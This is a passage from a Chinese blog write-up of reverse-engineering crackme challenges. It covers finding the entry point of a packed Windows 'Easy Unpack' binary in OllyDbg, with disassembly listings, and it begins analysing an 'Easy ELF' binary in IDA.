&lt;p&gt;readme说需要找OEP，也就是不用脱壳，只需要找入口点。PEiD看一下，壳类型为&lt;code&gt;ARVID's TDR file [Overlay] *&lt;/code&gt;。才疏学浅，没看到过……不过既然是Easy Unpack，料着也不会难倒哪里去。&lt;/p&gt;
&lt;p&gt;打开OD，载入程序，忽略各种错误。程序开始载入kernel32之后用了LoadLibrary、GetModuleHandle和FreeLibrary，典型的包装了IAT的壳。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;0040A04B&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;00A04000&lt;/span&gt;     &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Unp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0040A000&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;ASCII&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;
&lt;span class="nt"&gt;0040A050&lt;/span&gt;    &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;0DA04000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;kernel32.LoadLibrar&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;kernel32.LoadLibraryA&lt;/span&gt;
&lt;span class="mi"&gt;0040&lt;/span&gt;&lt;span class="nx"&gt;A056&lt;/span&gt;    &lt;span class="nx"&gt;A3&lt;/span&gt; &lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="nx"&gt;A64000&lt;/span&gt;     &lt;span class="nx"&gt;mov&lt;/span&gt; &lt;span class="nx"&gt;dword&lt;/span&gt; &lt;span class="nx"&gt;ptr&lt;/span&gt; &lt;span class="nx"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="nx"&gt;A644&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;0040A05B&lt;/span&gt;    &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;18A64000&lt;/span&gt;     &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Unp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0040A618&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;ASCII&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GetModuleHandleA&amp;quot;&lt;/span&gt;
&lt;span class="nt"&gt;0040A060&lt;/span&gt;    &lt;span class="nt"&gt;50&lt;/span&gt;              &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;0040A061&lt;/span&gt;    &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;11A04000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;kernel32.GetProcAdd&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;apphelp.7054FFF6&lt;/span&gt;
&lt;span class="mi"&gt;0040&lt;/span&gt;&lt;span class="nx"&gt;A067&lt;/span&gt;    &lt;span class="nx"&gt;A3&lt;/span&gt; &lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="nx"&gt;A64000&lt;/span&gt;     &lt;span class="nx"&gt;mov&lt;/span&gt; &lt;span class="nx"&gt;dword&lt;/span&gt; &lt;span class="nx"&gt;ptr&lt;/span&gt; &lt;span class="nx"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="nx"&gt;A648&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;0040A06C&lt;/span&gt;    &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;29A64000&lt;/span&gt;     &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Unp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0040A629&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;ASCII&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;FreeLibrary&amp;quot;&lt;/span&gt;
&lt;span class="nt"&gt;0040A071&lt;/span&gt;    &lt;span class="nt"&gt;FF35&lt;/span&gt; &lt;span class="nt"&gt;44A64000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="nx"&gt;A644&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;0040A077&lt;/span&gt;    &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;11A04000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;kernel32.GetProcAdd&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;apphelp.7054FFF6&lt;/span&gt;
&lt;span class="mi"&gt;0040&lt;/span&gt;&lt;span class="nx"&gt;A07D&lt;/span&gt;    &lt;span class="nx"&gt;A3&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="nx"&gt;CA64000&lt;/span&gt;     &lt;span class="nx"&gt;mov&lt;/span&gt; &lt;span class="nx"&gt;dword&lt;/span&gt; &lt;span class="nx"&gt;ptr&lt;/span&gt; &lt;span class="nx"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="nx"&gt;A64C&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后是很长一段外壳操作，直到一个长&lt;code&gt;jmp&lt;/code&gt;：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0040A082    6A 00           push 0
0040A084    FF15 48A64000   call dword ptr ds:[40A648]
0040A08A    A3 50A64000     mov dword ptr ds:[40A650],eax
0040A08F    B9 00904000     mov ecx,Easy_Unp.00409000
0040A094    BA EE944000     mov edx,Easy_Unp.004094EE
0040A099    3BCA            cmp ecx,edx
0040A09B    74 26           je short Easy_Unp.0040A0C3
0040A09D    8031 10         xor byte ptr ds:[ecx],10
0040A0A0    41              inc ecx
0040A0A1    3BCA            cmp ecx,edx
0040A0A3    74 1E           je short Easy_Unp.0040A0C3

...

0040A1ED    8031 40         xor byte ptr ds:[ecx],40
0040A1F0    41              inc ecx
0040A1F1    3BCA            cmp ecx,edx
0040A1F3    74 06           je short Easy_Unp.0040A1FB
0040A1F5    8031 50         xor byte ptr ds:[ecx],50
0040A1F8    41              inc ecx
0040A1F9  ^ EB D6           jmp short Easy_Unp.0040A1D1
0040A1FB  - E9 506FFFFF     jmp Easy_Unp.00401150
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;程序单步到0040A1FB之后，长跳到00401150，发现二进制数据是55，条件反射&lt;code&gt;push ebp&lt;/code&gt;，函数入口，于是Ctrl+A强制汇编数据，熟悉的入口结构来了~~&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;00401150&lt;/span&gt;  &lt;span class="o"&gt;/.&lt;/span&gt;  &lt;span class="nt"&gt;55&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;
&lt;span class="nt"&gt;00401151&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8BEC&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;esp&lt;/span&gt;
&lt;span class="nt"&gt;00401153&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;FF&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;-1&lt;/span&gt;
&lt;span class="nt"&gt;00401155&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;D0504000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Unp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;004050D0&lt;/span&gt;
&lt;span class="nt"&gt;0040115A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;1C1E4000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Unp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00401E1C&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="nt"&gt;Entry&lt;/span&gt; &lt;span class="nt"&gt;address&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;SE&lt;/span&gt; &lt;span class="err"&gt;处理程序安装&lt;/span&gt;
&lt;span class="nt"&gt;0040115F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;64&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;A1&lt;/span&gt; &lt;span class="nt"&gt;0000000&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;fs&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401165&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;00401166&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;64&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;8925&lt;/span&gt; &lt;span class="nt"&gt;00000&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;fs&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;esp&lt;/span&gt;
&lt;span class="nt"&gt;0040116D&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;83EC&lt;/span&gt; &lt;span class="nt"&gt;58&lt;/span&gt;       &lt;span class="nt"&gt;sub&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;58&lt;/span&gt;

&lt;span class="o"&gt;...&lt;/span&gt;

&lt;span class="nt"&gt;004011BC&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;8975&lt;/span&gt; &lt;span class="nt"&gt;FC&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;esi&lt;/span&gt;
&lt;span class="nt"&gt;004011BF&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;E1070000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;Easy_Unp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;004019A5&lt;/span&gt;
&lt;span class="nt"&gt;004011C4&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;38504000&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;405038&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;               &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;GetCommandLineA&lt;/span&gt;

&lt;span class="nx"&gt;...&lt;/span&gt;

&lt;span class="mi"&gt;004011&lt;/span&gt;&lt;span class="nx"&gt;EE&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;50&lt;/span&gt;            &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="nx"&gt;eax&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;pStartupinfo&lt;/span&gt;
&lt;span class="mi"&gt;004011&lt;/span&gt;&lt;span class="nx"&gt;EF&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="bp"&gt;.  &lt;/span&gt;&lt;span class="nx nx-Member"&gt;FF15&lt;/span&gt; &lt;span class="mi"&gt;34504000&lt;/span&gt; &lt;span class="nx"&gt;call&lt;/span&gt; &lt;span class="nx"&gt;dword&lt;/span&gt; &lt;span class="nx"&gt;ptr&lt;/span&gt; &lt;span class="nx"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;405034&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;               &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;GetStartupInfoA&lt;/span&gt;
&lt;span class="nt"&gt;004011F5&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;1B030000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;Easy_Unp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00401515&lt;/span&gt;

&lt;span class="o"&gt;...&lt;/span&gt;

&lt;span class="nt"&gt;0040120C&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;0040120D&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;FF75&lt;/span&gt; &lt;span class="nt"&gt;9C&lt;/span&gt;       &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.25&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;00401210&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;56&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;
&lt;span class="nt"&gt;00401211&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;56&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;pModule&lt;/span&gt;
&lt;span class="nt"&gt;00401212&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;30504000&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;405030&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;               &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;GetModuleHandleA&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;因此OEP为00401150。确实非常简单~~&lt;/p&gt;
&lt;h1&gt;Easy ELF&lt;/h1&gt;
&lt;p&gt;三道Windows之后来了一道Linux，不过无所谓啦。拖到Linux里面，看一下文件类型。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@YYX-Kali:~/upload# file Easy_ELF 
Easy_ELF: ELF &lt;span class="m"&gt;32&lt;/span&gt;-bit LSB executable, Intel &lt;span class="m"&gt;80386&lt;/span&gt;, version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt;, dynamically linked &lt;span class="o"&gt;(&lt;/span&gt;uses shared libs&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;for&lt;/span&gt; GNU/Linux &lt;span class="m"&gt;2&lt;/span&gt;.6.15, BuildID&lt;span class="o"&gt;[&lt;/span&gt;sha1&lt;span class="o"&gt;]=&lt;/span&gt;0x409edb8e3182380a2f58d49c7323dd895c74e1b7, stripped
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;基本信息就是ELF32位可执行文件，链接动态库，去符号表。&lt;/p&gt;
&lt;p&gt;运行一下程序，随便输入一点，提示&lt;code&gt;Wrong&lt;/code&gt;后直接退出。反复试了一些数字、字母之类的组合，都是一个结果。&lt;/p&gt;
&lt;p&gt;打开IDA（Windows下），拖入，开始逆向分析。直接&lt;code&gt;Shift+F12&lt;/code&gt;打开字符串窗口找到找到&lt;code&gt;Wrong&lt;/code&gt;，之后利用交叉引用跳回到调用函数，稍微向上翻一点就能看到关键函数了：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;F7&lt;/span&gt; &lt;span class="c"&gt;; =============== S U B R O U T I N E =======================================&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;080484&lt;/span&gt;&lt;span class="no"&gt;F7&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;F7&lt;/span&gt; &lt;span class="c"&gt;; Attributes: bp-based frame&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;080484&lt;/span&gt;&lt;span class="no"&gt;F7&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;F7&lt;/span&gt; &lt;span class="no"&gt;sub_80484F7&lt;/span&gt;     &lt;span class="no"&gt;proc&lt;/span&gt; &lt;span class="no"&gt;near&lt;/span&gt;               &lt;span class="c"&gt;; CODE XREF: sub_804851B+34p&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;080484&lt;/span&gt;&lt;span class="no"&gt;F7&lt;/span&gt;                 &lt;span class="no"&gt;push&lt;/span&gt;    &lt;span class="no"&gt;ebp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;F8&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;FA&lt;/span&gt;                 &lt;span class="no"&gt;sub&lt;/span&gt;     &lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;FD&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt; &lt;span class="c"&gt;; n&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08048505&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;offset&lt;/span&gt; &lt;span class="no"&gt;aCorrect&lt;/span&gt; &lt;span class="c"&gt;; &amp;quot;Correct!\n&amp;quot;&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804850&lt;/span&gt;&lt;span class="no"&gt;D&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;dword&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c"&gt;; fd&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08048514&lt;/span&gt;                 &lt;span class="no"&gt;call&lt;/span&gt;    &lt;span class="no"&gt;_write&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;08048519&lt;/span&gt;                 &lt;span class="nf"&gt;leave&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804851&lt;/span&gt;&lt;span class="nf"&gt;A&lt;/span&gt;                 &lt;span class="no"&gt;retn&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804851&lt;/span&gt;&lt;span class="nf"&gt;A&lt;/span&gt; &lt;span class="no"&gt;sub_80484F7&lt;/span&gt;     &lt;span class="no"&gt;endp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804851&lt;/span&gt;&lt;span class="nf"&gt;A&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804851&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804851&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt; &lt;span class="c"&gt;; =============== S U B R O U T I N E =======================================&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804851&lt;/span&gt;&lt;span class="no"&gt;B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804851&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt; &lt;span class="c"&gt;; Attributes: bp-based frame&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804851&lt;/span&gt;&lt;span class="no"&gt;B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804851&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt; &lt;span class="no"&gt;sub_804851B&lt;/span&gt;     &lt;span class="no"&gt;proc&lt;/span&gt; &lt;span class="no"&gt;near&lt;/span&gt;               &lt;span class="c"&gt;; DATA XREF: start+17o&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0804851&lt;/span&gt;&lt;span class="no"&gt;B&lt;/span&gt;                 &lt;span class="no"&gt;push&lt;/span&gt;    &lt;span class="no"&gt;ebp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0804851&lt;/span&gt;&lt;span class="nf"&gt;C&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
